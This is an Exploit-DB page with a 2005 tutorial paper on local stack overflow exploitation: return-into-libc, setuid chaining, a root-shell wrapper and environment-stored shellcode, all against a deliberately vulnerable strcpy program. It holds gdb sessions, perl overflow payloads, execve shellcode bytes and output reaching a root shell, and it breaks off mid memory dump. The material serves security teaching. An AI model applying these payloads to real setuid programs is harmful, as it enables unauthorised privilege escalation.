<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="KRSgZQsWV2okyWwIbykIbM7yVcYRezGVDLtYWy9B">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Local Stack Overflow (Advanced Module)</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/13240">
    <meta name="description" content="Local Stack Overflow (Advanced Module)">
    <meta name="keywords" content="Multiple,papers">
    <meta name="author" content="Gotfault Security">

    <meta property="og:title" content="Local Stack Overflow (Advanced Module)">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/13240">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2006-03-09" />
        <meta property="article:author" content="Gotfault Security" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=526" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Local Stack Overflow (Advanced Module)">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Local Stack Overflow (Advanced Module)
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                13240
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=526">
                                                                    Gotfault Security
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/13240" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 13240">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/13240" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 13240">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=multiple">
                                                                    Multiple
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2006-03-09
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13239" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/13294" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">                        Gotfault Security Community
                                  (GSC)
 
 
---------[ Chapter : 0x200                                      ]
---------[ Subject : Local Stack Overflow (Advcanced Module)    ]
---------[ Author  : xgc/dx A.K.A Thyago Silva                  ]
---------[ Date    : 09/10/2005                                 ]
---------[ Version : 2.1                                        ]
 
 
|=-----------------------------------------------------------------------------=|
 
---------[ Table of Contents ]
 
  0x210 - Objective
  0x220 - Requisites
  0x230 - Introduction to Returning Into Libc
  0x240 - Introduction to System Function 
  0x250 - Analysis of Vulnerable Source Code
  0x260 - Getting Informations
  0x270 - Returning Into System Function 
  0x280 - Setuid Call
  0x290 - Using Wrapper
  0x2a0 - Using Environment to Small Buffers
  0x2b0 - Analisys of Exploit Source C Code
  0x2c0 - Conclusion
 
|=-----------------------------------------------------------------------------=|
 
---------[ 0x210 - Objective ]

Execute code when the stack has enable to don&#039;t execute code.
Execute code when buffer isn&#039;t big enough for the shellcode.


---------[ 0x220 - Requisites ]

Introduction to Local Stack Overflow (Basic Module).


---------[ 0x230 - Introduction to Returning Into Libc ]

Most applications never need to execute anything on the stack, so an obvious defense
against buffer overflow exploits is to make the stack non-executable. When this is done,
shellcode existing anywhere on the stack is basically useless.

This type of defense will stop the majority of exploits out there, and it is becoming more
popular. The latest version of OpenBSD has a non-executable stack by default.
Of course, there is a corresponding technique that can be used to exploit programs in an
environment with a non-executable stack. This technique is known as returning into libc.

Libc is a standard C library that contains various basic functions, like printf() and exit().
These functions are shared, so any program that uses the printf() function directs execution
into the appropriate location in libc. An exploit can do the exact same thing and direct a
program&#039;s execution into a certain function in libc. The functionality of the exploit is 
limited by the functions in libc, which is a significant restriction when compared to 
arbitrary shellcode. However, nothing is ever executed on the stack.


---------[ 0x240 - Introduction to System Function ]

A point of interest is how to get the argument to system function. Essentially, what we do
is pass a pointer to the string (/bin/sh) we want executed. We know that normally when a 
program executes a function the arguments get pushed onto the stack in reverse order.
It is what happens next that is of interest to us and will allow us to pass parameters to
system function.

First, a CALL instruction is executed. This CALL will push the address of the next instruction
(where we want to return to) onto the stack. It will also decrement ESP by 4. When we return from
a function called, RET (or EIP) will be popped off the stack. ESP is then set to the address
directly following RET.

Now comes the actual return to system function. Called function assumes that ESP is already
pointing to the address that should be returned to. It is going to also assume that the 
parameters are sitting there waiting for it on the stack, starting with the first argument 
following RET. This is normal stack behavior described at basic module. We set the return to
system function and the argument (in our example, this will be a pointer to /bin/sh) in those
8 bytes. When Called function returns, it will return into system function, and its has our 
values waiting for it on the stack.

Now you need to understand the basics of the technique. Let.s take a look at the preparatory
work we must accomplish in order to make a Return to libc exploit via system function:

   1. Get the address of system().
   2. Get the address of exit().
   3. Get the address of string &quot;/bin/sh&quot;.


---------[ 0x250 - Analysis of Vulnerable Source Code ]

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {

  char buff[4];

  if(argc != 2) {
    printf(&quot;Needs an argument!\n&quot;);
    exit(-1);
  }

  strcpy(buff, argv[1]);

  return 1;
}

This program allows anybody, who exceeds the bounds of the variable buff, to overwrite
data on the stack. It would usually be quite easy to write an exploit for the above example
program, but let&#039;s assume that at our system was enabled a non-executable stack as a security
measure.


---------[ 0x260 - Getting Informations ]

The location of the system and exit functions in libc must be determined. This will be different
for every system, but once the location is known, it will remain the same until libc is recompiled.
One of the easiest ways to find the location of a libc function is to create a simple dummy program
and debug it.

#include &lt;stdio.h&gt;

int main() {

  return 1;
}


[xgc@knowledge:~]$ gcc -o dummy dummy.c -Wall
[xgc@knowledge:~]$ gdb ./dummy -q
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
(gdb) break main
Breakpoint 1 at 0x804835a
(gdb) run
Starting program: /home/xgc/dummy

Breakpoint 1, 0x0804835a in main ()
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0x4005b810 &lt;system&gt;
(gdb) print exit
$2 = {&lt;text variable, no debug info&gt;} 0x40046b00 &lt;exit&gt;
(gdb)

I ran gdb ready to debug our dummy program, and told to report breakpoint before running the 
dummy program.  By examining the report, I get the location of the libc function system and
exit in memory. However, we still need to know how we can store the string &quot;/bin/sh&quot; in memory
and ultimately reference it whenever needed.

Maybe we could use an environmental variable to hold the string? Yes, an environmental variable
would be ideal for this task, so let&#039;s create and use an environment variable called KNOWLEDGE to 
store our string (&quot;/bin/sh&quot;). But how are we going to know the memory address of our environment
variable and our string ? We can write a simple utility program to grab the memory address of the
environmental variable. Consider the following code:

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]) {

  char *pointer;

  if(argc != 2) {
    printf(&quot;Usage: %s &lt;variable&gt;\n&quot;, argv[0]);
    exit(-1);
  }

  pointer = getenv(argv[1]);

  if(pointer == NULL) {
    printf(&quot;Environmental variable %s does not exist!\n&quot;, argv[1]);
    exit(-1);
   }

  printf(&quot;%s is stored at address 0x%08x\n&quot;, argv[1], pointer);
  
  return 1;
}

[xgc@knowledge:~]$ export KNOWLEDGE=&quot;/bin/sh&quot;
[xgc@knowledge:~]$ gcc -o catch catch.c
[xgc@knowledge:~]$ ./catch KNOWLEDGE
KNOWLEDGE is stored at address 0xbfffffe2
[xgc@knowledge:~]$

So now, we have all necessary informations to exploit the vulnerable source code given.
The layout of our malicious buffer will looks like:

	|-------------------------------|-------------|------------|------------|
	|   data to overflow buffer     |   &amp;system   |   &amp;exit    |   /bin/sh  |
	|-------------------------------|-------------|------------|------------|

We choice exit address becouse this will be where system call returns. It&#039;s just for
a clean exploit effect.


---------[ 0x270 - Returning Into system function ]

With the informations, now we need to:

   1. Fill the vulnerable buffer up to the return address with garbage data;
   2. Overwrite the return address with the address of system();
   3. Follow system() with the address of exit(),
   4. Append the address of &quot;/bin/sh&quot; string.

[xgc@knowledge:~]$ gcc -o adv_stack adv_stack.c -Wall
[xgc@knowledge:~]$ gdb ./adv_stack -q
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
(gdb) run `perl -e &#039;print &quot;A&quot;x10&#039;`
Starting program: /home/xgc/adv_stack `perl -e &#039;print &quot;A&quot;x10&#039;`

Program received signal SIGSEGV, Segmentation fault.
0x40004141 in _dl_dst_substitute () from /lib/ld-linux.so.2
(gdb) run `perl -e &#039;print &quot;A&quot;x12&#039;`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/xgc/adv_stack `perl -e &#039;print &quot;A&quot;x12&#039;`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)


EIP register was overwrite with buffer size: 12bytes.

So, process layout will looks like:

	|---------------------------|----------------|--------------|--------------|
	|            08 A&#039;s         |   0x4005b810   |  0x40046b00  |  0xbfffffe2  |
	|---------------------------|----------------|--------------|--------------|
		   args         EBP           EIP


[xgc@knowledge:~]$ gdb ./adv_stack -q
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 &lt;main+0&gt;:    push   %ebp
0x080483f5 &lt;main+1&gt;:    mov    %esp,%ebp
0x080483f7 &lt;main+3&gt;:    sub    $0x18,%esp
0x080483fa &lt;main+6&gt;:    and    $0xfffffff0,%esp
0x080483fd &lt;main+9&gt;:    mov    $0x0,%eax
0x08048402 &lt;main+14&gt;:   sub    %eax,%esp
0x08048404 &lt;main+16&gt;:   cmpl   $0x2,0x8(%ebp)
0x08048408 &lt;main+20&gt;:   je     0x8048422 &lt;main+46&gt;
0x0804840a &lt;main+22&gt;:   movl   $0x8048554,(%esp)
0x08048411 &lt;main+29&gt;:   call   0x80482f8 &lt;_init+56&gt;
0x08048416 &lt;main+34&gt;:   movl   $0xffffffff,(%esp)
0x0804841d &lt;main+41&gt;:   call   0x8048308 &lt;_init+72&gt;
0x08048422 &lt;main+46&gt;:   mov    0xc(%ebp),%eax
0x08048425 &lt;main+49&gt;:   add    $0x4,%eax
0x08048428 &lt;main+52&gt;:   mov    (%eax),%eax
0x0804842a &lt;main+54&gt;:   mov    %eax,0x4(%esp)
0x0804842e &lt;main+58&gt;:   lea    0xfffffffc(%ebp),%eax
0x08048431 &lt;main+61&gt;:   mov    %eax,(%esp)
0x08048434 &lt;main+64&gt;:   call   0x8048318 &lt;_init+88&gt;
0x08048439 &lt;main+69&gt;:   mov    $0x1,%eax
0x0804843e &lt;main+74&gt;:   leave
0x0804843f &lt;main+75&gt;:   ret
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
End of assembler dump.
(gdb) break *main+75
Breakpoint 1 at 0x804843f
(gdb) display/1i $eip
(gdb) run testing.
Starting program: /home/xgc/adv_stack testing.

Breakpoint 1, 0x0804843f in main ()
1: x/i $eip  0x804843f &lt;main+75&gt;:       ret
(gdb) run testing.
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/xgc/adv_stack testing.

Breakpoint 1, 0x0804843f in main ()
1: x/i $eip  0x804843f &lt;main+75&gt;:       ret
(gdb) x/s 0xbffffffa-50
0xbfffffc8:      &quot;.28.151.26 22&quot;
(gdb)
0xbfffffd6:      &quot;KNOWLEDGE=/bin/sh&quot;
(gdb) x/s 0xbfffffd6+10
0xbfffffe0:      &quot;/bin/sh&quot;
(gdb) run `perl -e &#039;print &quot;A&quot;x8,&quot;\x10\xb8\x05\x40&quot;,&quot;\x01\x6b\x04\x40&quot;,&quot;\xe0\xff\xff\xbf&quot;&#039;`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/xgc/adv_stack `perl -e &#039;print &quot;A&quot;x8,&quot;\x10\xb8\x05\x40&quot;,&quot;\x01\x6b\x04\x40&quot;,
&quot;\xe0\xff\xff\xbf&quot;&#039;`

Breakpoint 1, 0x0804843f in main ()
1: x/i $eip  0x804843f &lt;main+75&gt;:       ret
(gdb) continue
Continuing.
sh-2.05b$


---------[ 0x280 - Setuid Call ]

In a BugTraq post, Solar Designer suggested chaining libc calls so a setuid() executes
before the system() call to restore privileges. This chaining can be done by taking advantage
of the return address value that was previously ignored. The following series of addresses will
chain a call from setuid() to system(), as shown in this illustration.

	|-----------------|-------------|-------------|---------------|---------------|
	|      garbage    |   &amp;setuid   |   &amp;system   |   setuid_arg  |   system_arg  |
	|-----------------|-------------|-------------|---------------|---------------|

The setuid() call will execute with its argument. Because it&#039;s only expecting one argument,
the argument for the system() call will be ignored. After it&#039;s finished, execution will
return to the system() function, which will use its argument as expected.

The idea of chaining calls is quite clever, but there are other problems inherent in this
method of restoring privileges.

The setuid() argument is expecting an unsigned integer value, so in order to restore root
level privileges, this value must be 0x00000000. Unfortunately, the buffer is still a string
that will be terminated by null bytes. Avoiding the use of null bytes, the lowest value that
can be used for this argument is 0x01010101, which has a decimal value of 16843009. While this
isn&#039;t quite the desired result, the concept of chaining calls still important.

[xgc@knowledge:~]$ gdb ./dummy -q
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
(gdb) break main
Breakpoint 1 at 0x804835a
(gdb) run
Starting program: /home/xgc/dummy

Breakpoint 1, 0x0804835a in main ()
(gdb) print setuid
$1 = {&lt;text variable, no debug info&gt;} 0x400c3850 &lt;setuid&gt;
(gdb) 

Now let&#039;s run again the program with informations about layout given:

[root@knowledge:/home/xgc]# chown root.root adv_stack
[root@knowledge:/home/xgc]# chmod +s adv_stack
[root@knowledge:/home/xgc]# exit
[xgc@knowledge:~]$ ./adv_stack `perl -e &#039;print 
&quot;A&quot;x8,&quot;\x50\x38\x0c\x40&quot;,&quot;\x10\xb8\x05\x40&quot;,&quot;\x01\x01\x01\x01&quot;,&quot;\xe2\xff\xff\xbf&quot;&#039;`
Segmentation fault
[xgc@knowledge:~]$ ./adv_stack `perl -e &#039;print 
&quot;A&quot;x8,&quot;\x50\x38\x0c\x40&quot;,&quot;\x10\xb8\x05\x40&quot;,&quot;\x01\x01\x01\x01&quot;,&quot;\xdc\xff\xff\xbf&quot;&#039;`
sh: line 1: in/sh: Permission denied
Segmentation fault
[xgc@knowledge:~]$ ./adv_stack `perl -e &#039;print 
&quot;A&quot;x8,&quot;\x50\x38\x0c\x40&quot;,&quot;\x10\xb8\x05\x40&quot;,&quot;\x01\x01\x01\x01&quot;,&quot;\xda\xff\xff\xbf&quot;&#039;`
sh-2.05b$ id
uid=16843009 gid=1000(xgc) egid=0(root) groups=1000(xgc)
sh-2.05b$

The address of the setuid() function is determined the same way as before, and the chained 
libc call is set up as described previously. As expected, the uid is set to 16843009, but this
is still far from a root shell. Somehow, a setuid(0) call must be made without terminating the
string early with null bytes.


---------[ 0x290 - Using Wrapper ]

One simple and effective solution is to create a wrapper program. This wrapper will set the user ID (and group ID)
to 0 and then spawn a shell. This program doesn&#039;t need any special privileges, because the vulnerable suid root
program will be executing it.

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {

  setuid(0);
  setgid(0);
  system(&quot;/bin/sh&quot;);
}

[xgc@knowledge:~]$ export WRAPPER=&quot;./wrapper&quot;
[xgc@knowledge:~]$ ./catch WRAPPER
WRAPPER is stored at address 0xbffffefa
[xgc@knowledge:~]$

So, process layout will looks like:

	|---------------------------|----------------|--------------|--------------|
	|            08 A&#039;s         |   0x4005b810   |  0x40046b00  |  0xbffffef2  |
	|---------------------------|----------------|--------------|--------------|
		   args         EBP           EIP


[xgc@knowledge:~]$ ./adv_stack `perl -e &#039;print &quot;A&quot;x8,&quot;\x10\xb8\x05\x40&quot;,&quot;\x01\x6b\x04\x40&quot;,&quot;\xf2\xfe\xff\xbf&quot;&#039;`
sh-2.05b# id
uid=0(root) gid=0(root) groups=1000(xgc)
sh-2.05b#


---------[ 0x2a0 - Using Environment to Small Buffers ]

Sometimes a buffer will be too small to even fit shellcode into. In this case, the shellcode
can be stashed in an environment variable. Environment variables are used by the user shell for
a variety of things, but the key point of interest is that they are stored in an area of memory
that program execution can be redirected to. So if a buffer is too small to fit the NOP sled,
shellcode, and repeated return address, the sled and shellcode can be stored in an environment
variable with the return address pointing to that address in memory. Here is the vulnerable
piece of code, using a buffer that is too small for shellcode:

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {

  char buff[4];

  if(argc != 2) {
    printf(&quot;Needs an argument!\n&quot;);
    exit(-1);
  }

  strcpy(buff, argv[1]);

  return 1;
}

Because the buffer is only four bytes long, there is no space for shellcode to be inserted.
It must be stored elsewhere. One ideal candidate for holding the shellcode is an environment
variable.

execle() function has one additional argument, which is the environment that the executing
process should run under. This environment is presented in the form of an array of pointers to
null-terminated strings for each environment variable, and the environment array itself is
terminated with a null pointer.

This means that an environment containing shellcode can be created by using an array of pointers,
the first of which points to the shellcode, and the second consisting of a null pointer.

Then the execle() function can be called using this environment to execute the second vulnerable
program, overflowing the return address with the address of the shellcode. Luckily, the address of
an environment invoked in this manner is easy to calculate. In Linux, the address will be 0xbffffffa,
minus the length of the environment, minus the length of the name of the executed program. Because
this address will be exact, there is no need for an NOP sled. All that&#039;s needed in the exploit buffer
is the address, repeated enough times to overflow the return address in the stack.

Of course, this technique can also be used without an exploit program. In the bash shell, environment
variables are set and exported using export VARNAME=value. Using export, Perl, and a few pairs of
grave accents, the shellcode and a generous NOP sled can be put into the current environment:

[xgc@knowledge:~]$ export SHELLCODE=`perl -e &#039;print &quot;\x90&quot;x10,&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3
\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;&#039;`

Let&#039;s see where environment variable SHELLCODE is located inside GDB:

[xgc@knowledge:~]$ gdb ./adv_stack -q
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
(gdb) run `perl -e &#039;print &quot;A&quot;x12&#039;`
Starting program: /home/xgc/adv_stack `perl -e &#039;print &quot;A&quot;x12&#039;`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/128bx $esp
0xbffffad0:     0x00    0x00    0x00    0x00    0x24    0xfb    0xff    0xbf
0xbffffad8:     0x30    0xfb    0xff    0xbf    0x30    0x83    0x04    0x08
0xbffffae0:     0x00    0x00    0x00    0x00    0xd0    0xbc    0x00    0x40
0xbffffae8:     0x74    0xbd    0x14    0x40    0xa0    0x6c    0x01    0x40
0xbffffaf0:     0x02    0x00    0x00    0x00    0x30    0x83    0x04    0x08
0xbffffaf8:     0x00    0x00    0x00    0x00    0x51    0x83    0x04    0x08
0xbffffb00:     0xf4    0x83    0x04    0x08    0x02    0x00    0x00    0x00
0xbffffb08:     0x24    0xfb    0xff    0xbf    0x40    0x84    0x04    0x08
0xbffffb10:     0xa0    0x84    0x04    0x08    0x80    0xc3    0x00    0x40
0xbffffb18:     0x1c    0xfb    0xff    0xbf    0x00    0x00    0x00    0x00
0xbffffb20:     0x02    0x00    0x00    0x00    0x07    0xfc    0xff    0xbf
